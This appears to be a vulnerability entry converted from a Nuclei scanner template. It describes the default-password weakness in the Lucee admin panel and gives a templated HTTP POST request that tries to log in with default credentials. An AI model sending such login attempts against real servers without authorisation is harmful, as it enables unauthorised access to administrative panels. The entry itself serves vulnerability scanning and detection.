# Vulnerability: Lucee - Default Login
**Classification:** CWE-1392
**Source:** Nuclei Template (`lucee-default-login.yaml`)

## Description
Lucee admin panel using the default login password was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

login_passwordweb={{password}}&lang=en&rememberMe=s&submit=submit
```

